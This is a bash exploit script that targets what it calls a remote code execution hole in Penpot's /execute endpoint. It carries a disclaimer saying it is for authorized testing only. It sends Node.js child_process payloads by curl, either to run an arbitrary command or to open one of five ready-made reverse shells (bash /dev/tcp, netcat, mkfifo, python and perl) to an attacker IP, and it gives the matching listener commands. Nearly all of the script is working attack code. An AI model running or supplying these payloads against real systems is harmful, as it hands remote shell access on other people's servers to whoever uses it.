#!/bin/bash

# Penpot RCE Exploit Script (Disclosed CVE - Authorized Testing Only)
# This script exploits a Node.js code execution vulnerability in Penpot's /execute endpoint
# Only use this on systems you own or have explicit authorization to test

set -euo pipefail

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Default values
TARGET_URL=""
ATTACKER_IP=""
REVERSE_SHELL_TYPE=""
COMMAND=""
PORT=4443
OUTPUT_FILE="/tmp/penpot_payload.json"

usage() {
    cat << EOF
${GREEN}Penpot RCE Exploit Script${NC}
Usage: $0 [OPTIONS]

${YELLOW}Required:${NC}
  -u, --url <URL>           Target Penpot URL (e.g., http://localhost:4403)

${YELLOW}Payload Options (choose one):${NC}
  -c, --command <CMD>       Execute a direct command
  -o, --reverse <TYPE>      Reverse shell type (bash, nc, mkfifo, python, perl)
  -i, --attacker-ip <IP>    Attacker IP for reverse shell
  -p, --port <PORT>         Listening port for reverse shell (default: 4443)

${YELLOW}Examples:${NC}
  # Direct command execution
  $0 -u http://localhost:4403 -c "whoami"

  # Bash reverse shell
  $0 -u http://localhost:4403 -i 192.168.1.100 -o bash -p 4443

  # Netcat reverse shell
  $0 -u http://localhost:4403 -i 192.168.1.100 -o nc -p 4443

  # MkFIFO reverse shell
  $0 -u http://localhost:4403 -i 192.168.1.100 -o mkfifo -p 4443

${YELLOW}Listener Setup:${NC}
  nc -lvnp 4443        # For bash/mkfifo/perl reverse shells
  ncat -lvnp 4443      # Alternative netcat
  socat - TCP-L:4443   # Socat listener

${RED}DISCLAIMER:${NC} This tool is for authorized security testing only.
Unauthorized access to computer systems is illegal.

EOF
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            TARGET_URL="$2"
            shift 2
            ;;
        -c|--command)
            COMMAND="$2"
            shift 2
            ;;
        -i|--attacker-ip)
            ATTACKER_IP="$2"
            shift 2
            ;;
        -o|--reverse)
            REVERSE_SHELL_TYPE="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -h|--help)
            usage
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            usage
            ;;
    esac
done

# Validation
if [[ -z "$TARGET_URL" ]]; then
    echo -e "${RED}Error: Target URL is required (-u)${NC}"
    usage
fi

# Ensure URL doesn't end with /
TARGET_URL="${TARGET_URL%/}"

# Verify endpoint
if ! curl -s -m 2 "$TARGET_URL/execute" &>/dev/null; then
    echo -e "${YELLOW}[*] Warning: Could not verify endpoint at $TARGET_URL/execute${NC}"
fi

# Generate payload based on mode
generate_payload() {
    local payload=""

    if [[ -n "$COMMAND" ]]; then
        # Direct command execution
        echo -e "${GREEN}[+] Mode: Direct Command Execution${NC}"
        echo -e "${GREEN}[+] Command: $COMMAND${NC}"
        payload="require(\"child_process\").execSync(\"$COMMAND\").toString()"
    elif [[ -n "$REVERSE_SHELL_TYPE" && -n "$ATTACKER_IP" ]]; then
        # Reverse shell payloads
        echo -e "${GREEN}[+] Mode: Reverse Shell${NC}"
        echo -e "${GREEN}[+] Type: $REVERSE_SHELL_TYPE${NC}"
        echo -e "${GREEN}[+] Target: $ATTACKER_IP:$PORT${NC}"

        case "$REVERSE_SHELL_TYPE" in
            bash)
                payload="require(\"child_process\").execSync(\"bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1\").toString()"
                ;;
            nc|netcat)
                payload="require(\"child_process\").execSync(\"nc -e /bin/bash $ATTACKER_IP $PORT\").toString()"
                ;;
            mkfifo)
                payload="require(\"child_process\").execSync(\"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ATTACKER_IP $PORT >/tmp/f\").toString()"
                ;;
            python)
                payload="require(\"child_process\").execSync(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$ATTACKER_IP\\\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\").toString()"
                ;;
            perl)
                payload="require(\"child_process\").execSync(\"perl -e 'use Socket;\\$i=\\\"$ATTACKER_IP\\\";\\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\").toString()"
                ;;
            *)
                echo -e "${RED}Error: Unknown reverse shell type: $REVERSE_SHELL_TYPE${NC}"
                echo "Supported types: bash, nc, mkfifo, python, perl"
                exit 1
                ;;
        esac
    else
        echo -e "${RED}Error: Provide either -c (command) or -o (reverse shell) with -i (attacker IP)${NC}"
        usage
    fi

    echo "$payload"
}

# Generate and send payload
PAYLOAD=$(generate_payload)

# Escape the payload for JSON
ESCAPED_PAYLOAD=$(echo "$PAYLOAD" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')

# Create JSON payload
cat > "$OUTPUT_FILE" << EOF
{"code":"$ESCAPED_PAYLOAD"}
EOF

echo -e "${YELLOW}[*] Payload JSON saved to: $OUTPUT_FILE${NC}"
echo -e "${YELLOW}[*] Payload content:${NC}"
cat "$OUTPUT_FILE" | jq '.' 2>/dev/null || cat "$OUTPUT_FILE"

# Send exploit
echo -e "${YELLOW}[*] Sending exploit to $TARGET_URL/execute${NC}"

RESPONSE=$(curl -s -X POST "$TARGET_URL/execute" \
    -H "Content-Type: application/json" \
    -d @"$OUTPUT_FILE" 2>&1)

echo -e "${GREEN}[+] Response:${NC}"
echo "$RESPONSE"

# Cleanup
rm -f "$OUTPUT_FILE"

echo -e "${GREEN}[+] Exploit sent!${NC}"

if [[ -n "$COMMAND" ]]; then
    echo -e "${GREEN}[+] Command output should appear above${NC}"
elif [[ -n "$REVERSE_SHELL_TYPE" ]]; then
    echo -e "${GREEN}[+] Check your listener for incoming connection${NC}"
    echo -e "${GREEN}[+] Run: nc -lvnp $PORT${NC}"
fi
